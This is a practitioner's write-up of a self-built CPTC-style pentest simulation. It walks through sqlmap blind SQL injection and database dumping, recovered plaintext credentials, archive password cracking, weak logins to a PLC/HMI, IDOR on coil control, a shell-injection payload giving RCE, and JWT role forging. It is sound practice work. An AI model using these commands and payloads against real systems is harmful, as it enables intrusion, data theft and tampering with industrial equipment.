---
title: My Own CPTC Simulation Findings
description: My Own CPTC Simulation Findings
date: '2026-11-03'
tags:
  - Pentesting
published: false
slug: my-own-cptc-simulation-findings
category: CPTC
---
i have made a CPTC simulation while practicing. 

those are the findings and writeup for the simulation. 

# Finding 1:

website uses HTTP and not HTTPS


# Finding 2:
Weak password policy on port 7001

i can set my password as 123456789


![Screenshot From 2026-11-03 17-49-12](/images/writeups/my-own-cptc-simulation-findings/screenshot-from-2026-11-03-17-49-12.png)


# Finding 3: Time Based Blind SQL Injection in Username Parameter on /login

running the command: 
```bash
sqlmap -u "http://127.0.0.1:7001/login" \
  --data="username=dsadas&password=dsadsa" \
  -p username \
  --ignore-code 401 \
  --batch 
```

the results:

```
<SNIP>
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 77 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=dsadas' AND (SELECT 7416 FROM (SELECT(!SLEEP(5)))uDpa) AND 'IjrG'='IjrG&password=dsadsa
---
```


lets proceed on that finding:

dumping the database process:
```
sqlmap -u "http://127.0.0.1:7001/login" \
  --data="username=dsadas&password=dsadsa" \
  -p username --ignore-code 401 --batch --dbs  
```

we get: 
```
available databases [2]:
[*] information_schema
[*] ticketing
```

Now for the tables:
```
sqlmap -u "http://127.0.0.1:7001/login" \
  --data="username=dsadas&password=dsadsa" \
  -p username --ignore-code 401 --batch \
  -D ticketing --tables  
```

we get:
```
Database: ticketing
[5 tables]
+---------------+
| gift_orders   |
| products      |
| sessions      |
| ticket_orders |
| users         |
+---------------+
```

im gonna extract users on a seperate terminal than the rest of the tables.

```
sqlmap -u "http://127.0.0.1:7001/login" \
  --data="username=dsadas&password=dsadsa" \
  -p username --ignore-code 401 --batch \
  -D ticketing -T users --dump  
```

and while running this one, we can find the admin's details.

```
<SNIP>
admin
[18:01:55] [INFO] retrieved: Omar Haddad
[18:02:28] [INFO] retrieved: 1
[18:02:30] [INFO] retrieved: TidalRidge!84
[18:03:14] [INFO] retrieved: 9250
[18:03:22] [INFO] retrieved: admin
<SNIP>
```

lets try logging in. it works.

now lets FUZZ:


![Screenshot From 2026-11-03 18-07-57](/images/writeups/my-own-cptc-simulation-findings/screenshot-from-2026-11-03-18-07-57.png)

we can see /admin

lets go to it

we can download a password protected archive compressed file:

![Screenshot From 2026-11-03 18-08-52](/images/writeups/my-own-cptc-simulation-findings/screenshot-from-2026-11-03-18-08-52.png)

lets attempt to crack it:

```
zip2john protected.zip > hash.txt
~/john/run/john --wordlist=/home/nabil/tools/SecLists/Passwords/Leaked-Databases/rockyou.txt hash.txt  
```


the full users table: 


![Screenshot From 2026-11-03 18-26-47](/images/writeups/my-own-cptc-simulation-findings/screenshot-from-2026-11-03-18-26-47.png)
see finding 3

# Finding 3 
Passwords Stored in plaintext:
![Screenshot From 2026-11-03 18-26-47](/images/writeups/my-own-cptc-simulation-findings/screenshot-from-2026-11-03-18-26-47.png)


# Finding 4
Weak Password on Protected admin Archive:


![Screenshot From 2026-11-03 18-19-47](/images/writeups/my-own-cptc-simulation-findings/screenshot-from-2026-11-03-18-19-47.png)


we can find lots of files, one which is an ssh key, but we dont know the user of it.

**the intention was for the pentester to get the username from the AD pentesters. but that didnt work since its a machine, so i decided i would pass it in an email inject**

![Screenshot From 2026-11-03 18-22-58](/images/writeups/my-own-cptc-simulation-findings/screenshot-from-2026-11-03-18-22-58.png)

upon reading all the articles we can find a user called "maya.chen"

![Screenshot From 2026-11-03 18-24-52](/images/writeups/my-own-cptc-simulation-findings/screenshot-from-2026-11-03-18-24-52.png)

and another interesting thing we can find, the details about how backups are taken on the website:


![Screenshot From 2026-11-03 18-28-22](/images/writeups/my-own-cptc-simulation-findings/screenshot-from-2026-11-03-18-28-22.png)


the ssh username is pondtech, the ssh port is at 2222

we can connect as pondtech:

![Screenshot From 2026-11-03 18-34-37](/images/writeups/my-own-cptc-simulation-findings/screenshot-from-2026-11-03-18-34-37.png)

the user is unprivileged, so we cant do anything at all

moving on to port 7002


Port 7002 controls OT and PLC Operations. An HMI

but its protected:


![Screenshot From 2026-11-03 18-38-51](/images/writeups/my-own-cptc-simulation-findings/screenshot-from-2026-11-03-18-38-51.png)

we remember the OT/ICS Employee maya.chen username

lets try something simple
# thats a finding. i lost count, i hope ai fixes those finding numbers and shit
username as a password:

username: maya.chen
password: maya.chen

:


![Screenshot From 2026-11-03 18-40-46](/images/writeups/my-own-cptc-simulation-findings/screenshot-from-2026-11-03-18-40-46.png)

we can only control one register

lets change it and intercept the burp suite request. 

we can change through the coil value through the API


![Screenshot From 2026-11-03 18-42-39](/images/writeups/my-own-cptc-simulation-findings/screenshot-from-2026-11-03-18-42-39.png)

lets change the PLC address in the /api/v1/plc/{name}

we need to be careful from changing, but we need to make sure that we are able to change. so im going to switch from on to on or off to off.

and see what the response gives us

and we can. IDOR and Client Sided Validation which is a finding. 


![Screenshot From 2026-11-03 18-44-29](/images/writeups/my-own-cptc-simulation-findings/screenshot-from-2026-11-03-18-44-29.png)


lets fuzz for more stuff

we can see: 


![Screenshot From 2026-11-03 18-45-33](/images/writeups/my-own-cptc-simulation-findings/screenshot-from-2026-11-03-18-45-33.png)

we can see robots.txt

lets see it 


![Screenshot From 2026-11-03 18-46-15](/images/writeups/my-own-cptc-simulation-findings/screenshot-from-2026-11-03-18-46-15.png)



![Screenshot From 2026-11-03 18-46-51](/images/writeups/my-own-cptc-simulation-findings/screenshot-from-2026-11-03-18-46-51.png)

we can also see that there is a JWT Token on that website


![Screenshot From 2026-11-03 18-47-54](/images/writeups/my-own-cptc-simulation-findings/screenshot-from-2026-11-03-18-47-54.png)

i tried to crack the key, didnt work, i tried to change alg to none, didnt work.

so we will go back to this if we find a secret and change our role to admin

moving on to the website on 7003


![Screenshot From 2026-11-03 18-50-49](/images/writeups/my-own-cptc-simulation-findings/screenshot-from-2026-11-03-18-50-49.png)

lets try to use the same admin password from before

and we get: 

admin
TidalRidge!84

and we log in!

im not sure if this is considered password reuse


upon testing all the vulnerabilities, nothing works. 

but we see this:


![Screenshot From 2026-11-03 18-53-17](/images/writeups/my-own-cptc-simulation-findings/screenshot-from-2026-11-03-18-53-17.png)

this validates the input to be a date on the client side


![Screenshot From 2026-11-03 18-54-00](/images/writeups/my-own-cptc-simulation-findings/screenshot-from-2026-11-03-18-54-00.png)

lets try putting a valid date then moving the request to burpsuite

we remember the article was talking about the backup running a custom backup binary on the system. so we can test for command injection

i sent the data:

12-30-1990+%3b+ls

which is just 12-30-1990 ; ls

and the output:

```
Backup done at 12-30-1990 ; ls
snapshot queued: 12-30-1990
node_modules
package-lock.json
package.json
public
server.js
views
```


![Screenshot From 2026-11-03 18-57-18](/images/writeups/my-own-cptc-simulation-findings/screenshot-from-2026-11-03-18-57-18.png)

CONFIRMED RCE

lets get a reverse shell 


![Screenshot From 2026-11-03 19-04-56](/images/writeups/my-own-cptc-simulation-findings/screenshot-from-2026-11-03-19-04-56.png)


![Screenshot From 2026-11-03 19-05-37](/images/writeups/my-own-cptc-simulation-findings/screenshot-from-2026-11-03-19-05-37.png)


![Screenshot From 2026-11-03 19-06-01](/images/writeups/my-own-cptc-simulation-findings/screenshot-from-2026-11-03-19-06-01.png)

we can see we have everything, lets try to priv esc


![Screenshot From 2026-11-03 19-07-16](/images/writeups/my-own-cptc-simulation-findings/screenshot-from-2026-11-03-19-07-16.png)


we can see `cp` has SUID bit

we can abuse that.


![Screenshot From 2026-11-03 19-10-06](/images/writeups/my-own-cptc-simulation-findings/screenshot-from-2026-11-03-19-10-06.png)

heres all the commands


now we can move to the android app (too lazy to attack it now ngl. those are enough)
lets do one last thing, lets change our role to admin with the jwt secret that we found on port 7002


![Screenshot From 2026-11-03 19-34-29](/images/writeups/my-own-cptc-simulation-findings/screenshot-from-2026-11-03-19-34-29.png)


![Screenshot From 2026-11-03 19-35-13](/images/writeups/my-own-cptc-simulation-findings/screenshot-from-2026-11-03-19-35-13.png)
we have access to control all the coils without needing to mess with the apis now

and we can also see the api we found on robots.txt


![Screenshot From 2026-11-03 19-36-03](/images/writeups/my-own-cptc-simulation-findings/screenshot-from-2026-11-03-19-36-03.png)
